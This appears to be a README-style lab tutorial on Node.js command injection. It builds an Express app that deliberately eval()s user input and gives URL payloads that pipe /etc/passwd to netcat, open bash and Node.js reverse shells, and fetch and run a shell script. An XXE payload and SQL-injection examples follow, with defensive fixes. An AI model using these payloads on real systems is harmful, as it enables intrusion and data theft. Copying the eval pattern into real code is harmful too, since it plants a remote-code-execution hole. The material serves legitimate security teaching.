# NodeJS-Exploitation
Basic NodeJS Exploitation for data exfiltration and reverse shells

Node.js is an open-source, cross-platform, back-end, JavaScript runtime environment that executes JavaScript code outside a web browser.

NodeJS "child_process" allow the application to create a child process and access the underlying operating system functionalities by running any system command inside the child process

There are four different ways to create a child process in Node:

- spawn()
- fork()
- exec()
- execFile()

child_process.exec() = Used to spawn a shell and execute system level command. It stores output in a buffer , used by developers when not expecting large amounts of data to be returned

child_process.spawn() = Function executes a command in a new process. Used by developers when expecting a large amount of output from your command

Basic Lab Setup

Victim IP   ::: 192.168.10.100

Attacker IP ::: 192.168.10.10

Make sure to replace the attacker ip where necessary to get the call back to your system

Victim 

Installing package dependencies
```
apt-get install nodejs
apt install nodejs-legacy
apt-get install npm
npm install express

```
Create new file called app.js with the below content
```
var express = require('express');
var app = express();
app.get('/', function (req, res) {
    res.send('Hello ' + eval(req.query.q));
    console.log(req.query.q);
});
app.listen(8080, function () {
    console.log('app listening on port 8080!');
});
```
Run the app
```
node app.js
```

Open the app
```
http://192.168.10.100:8080
```
Attacker

Pass it user input
```
http://192.168.10.100:8080/?q='Test'
```

Exfiltrate the /etc/passwd file of the remote system

```
http://192.168.10.100:8080/?q=require('child_process').exec('cat+/etc/passwd+|+nc+192.168.10.10+9999')
```

Obtain Reverse Shell (Method 1)

Inject RCE inside URL 
```
http://192.168.10.100:8080/?q=require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.10.10/9999 0>%261"')
nc -lvnp 9999
```
Obtain Reverse Shell (Method 2)

Inject RCE to go and download the reverse shell from your machine and then execute it locally by invoking node

Create NodeJS reverse shell - Code below and save to a file called shell.js

Replace IP and Port 
```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9999, "192.168.10.10", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; 
})();
```
Create a local webserver hosting shell.js
```
python3 -m http.server 9000
```
Start a listener
```
nc -lvnp 443
```
Trigger RCE and get reverse shell
```
http://192.168.10.100:8080/?q=require("child_process").exec('bash -c "wget http://192.168.10.10:9000/shell.js; node shell.js"')
```

# How to prevent NodeJS command injection attacks

- Never accept user input from the public and pass it to child_process.exec()
- Try to avoid letting users pass in options to commands if possible. Typically values are okay when using spawn or execfile, but selecting options via a user controlled string   is a bad idea
- If you must allow for user controlled options, look at the options for the command extensively, determine which options are safe, and whitelist only those options
- Use execfile() or spawn() to seperate the command and its arguments. It prevents malicious user input from running subcommands inside a shell enviroment. However the linux       find command has the ability to read/write to files , which means that the linux find comamnd can still be abused for data exfiltration and the -exec argument for code           Execution

# Secure Code Development Examples

Secure Development Lifecycle (SDL) is the process of including security artifacts in the Software Development Lifecycle (SDLC) to help mitigate and remediate security vulnerabilities before any appication goes into production. Following secure coding practices help mitigate opportunistic threats from a foundational level , assisting the organization achieve financial stability from a business point of view and breach resistance from a technical perspective

Preventing the following attacks in NodeJS by applying secure coding standards

- SQL / NoSQL Injections
- XML Attacks
- XSS Attacks

Vulnerable Code Example (SQL / NoSQL Injection Attacks)
```
const db = require('./db');
app.get('/users', (req, res) => {
  db.query('SELECT * FROM Users WHERE UserID = ' + req.query.id);
    .then((users) => {
      ...
      res.send(users);
    })
});
```
The code below is susceptible to an injection attack because user input is not sanitised. If the attacker passes in 200 OR 1=1 as req.query.id, The system will return all the rows from the Users table because of the RHS (right-hand side) of the OR command which evaluates as TRUE.

A secure way of preventing injection attacks is by sanitising/validating inputs coming from the user. Writing a validation rule that only accepts a value of type int will help prevent an injection attack.

Using prepared statements or parameterised inputs can also help to prevent injection attacks because then inputs are treated as inputs and not part of an SQL statement to be executed.

Although the MySQL for Node package doesn't currently support parametrised inputs, Injection attacks can be prevented by escaping user inputs, secure code below

Secure Code (Preventing SQL / NoSQL Injection Attacks)
```
...
let sql_query    = 'SELECT * FROM users WHERE id = ' + connection.escape(req.query.id);
connection.query(sql_query, function (error, results, fields) {
  if (error) throw error;
  // ...
});
...
```
Preventing NodeJS XML Attacks

Vulnerable Code Example
```
<?xml version="1.0" encoding="ISO-8859-1"?>
   <email>sammy@domain.com</email>
</xml>
```
The XML Attack Code to Exfiltrate the /etc/passwd file
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY bar SYSTEM "file:///etc/passwd" >]>
   <email>sammy@domain.com</email>
   <foo>&bar;</foo>
</xml>
```
XML external entities attack is an attack in which XML processors are tricked into allowing data from external or local resources. Older XML processors by default allow the specification of an external entity (i.e. a URI which is evaluated during XML processing).

A successful XXE injection attack can seriously compromise the application which it's performed on and its underlying server
Disallowing document type definitions (DTD) is a strong defence against XXE injections attacks

Secure Code (Preventing XML Attacks)
```
//npm install libxmljs
var libxml = require("libxmljs");
var parserOptions = {
    noblanks: true,
    noent: false,
    nocdata: true
};
try {
    var doc = libxml.parseXmlString(data, parserOptions);
} catch (e) {
    return Promise.reject('Xml parsing error');
```





